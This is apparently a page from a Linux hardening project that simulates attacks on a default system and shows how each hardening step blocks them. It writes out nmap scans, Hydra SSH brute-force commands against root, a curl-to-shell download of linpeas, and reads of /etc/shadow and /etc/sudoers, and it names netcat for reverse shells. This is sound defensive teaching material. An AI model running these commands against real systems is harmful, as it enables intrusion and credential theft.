# Attack Simulation

> Understanding what an attacker sees and does against a default Linux system. Offensive findings directly inform and prioritize the defensive controls in this project.

---

> ⚠️ **Disclaimer:** These simulations are performed in a controlled, isolated lab environment against systems you own and have permission to test. Never run these tools against systems you do not own.

---

## Default System Vulnerabilities (Before Hardening)

| Vulnerability | Attack Vector |
|---|---|
| SSH open on port 22 | Brute-force via Hydra / Medusa |
| Root login enabled | Direct root compromise via credentials |
| Default / weak passwords | Dictionary or credential stuffing |
| Unnecessary services running | Expanded attack surface per service |
| No ASLR / kernel hardening | Memory exploitation easier |
| No firewall rules | All ports accessible |
| No MAC enforcement | Compromised process can access any resource |
| No audit logging | Attacker actions undetected and unrecorded |

---

## Scenario 1 — Port & Service Enumeration (Nmap)

An attacker begins by scanning the target to discover open ports, running services, and OS fingerprint.

```bash
# Basic version scan
nmap -sV -sC -O -p- <target-ip>

# Aggressive scan
nmap -A -T4 <target-ip>
```

**Default result:** SSH (22) exposed, other daemons visible, OS fingerprint leaked.

**After hardening:** Only ports 2222, 80, 443 visible. OS fingerprint obscured.

---

## Scenario 2 — SSH Brute Force (Hydra)

With SSH on port 22 and root login enabled, brute-force is straightforward.

```bash
# Brute force root
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

# Target a specific user
hydra -l admin -P passwords.txt -t 4 ssh://<target-ip>:22
```

**Default result:** Success if weak credentials are set. No lockout, no alerting.

**After hardening:**
- Port changed to 2222 — automated scripts targeting port 22 fail immediately
- `PasswordAuthentication no` — password-based brute force impossible
- `MaxAuthTries 3` — connection dropped after 3 failures
- `PermitRootLogin no` — root is not a valid SSH target

---

## Scenario 3 — Privilege Escalation Enumeration (linpeas)

Once inside as a low-privilege user, the attacker enumerates escalation paths.

```bash
# Download and execute linpeas on the target
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Default result:** Exposes SUID binaries, weak sudo rules, kernel version exploits, writable paths, unprotected cron jobs.

**After hardening:**
- `fs.suid_dumpable = 0` reduces SUID abuse vectors
- AppArmor / SELinux confines what SUID processes can access
- Unnecessary packages removed — fewer SUID binaries present

---

## Scenario 4 — Unauthorized File Access

Without MAC enforcement, a compromised process or low-privilege user can attempt direct sensitive file access.

```bash
# Attempt to read the shadow file
cat /etc/shadow

# Check sudoers for misconfigurations
cat /etc/sudoers
sudo -l
```

**Default result:** Shadow file may be readable depending on misconfiguration. Sudoers reveals privilege paths.

**After hardening:**
- AppArmor / SELinux denies process access outside its profile
- auditd records every attempted read/write on `/etc/shadow` and `/etc/sudoers`

---

## Offensive Tools Summary

| Tool | Use Case |
|---|---|
| Nmap | Port scanning, service enumeration, OS detection |
| Hydra | SSH / HTTP brute-force credential attacks |
| linpeas.sh | Post-exploitation privilege escalation enumeration |
| Metasploit | Exploit delivery and post-exploitation modules |
| Netcat (nc) | Reverse shell listener and connection testing |

---

## Next Step

→ [Defensive Controls](09-defensive-controls.md)
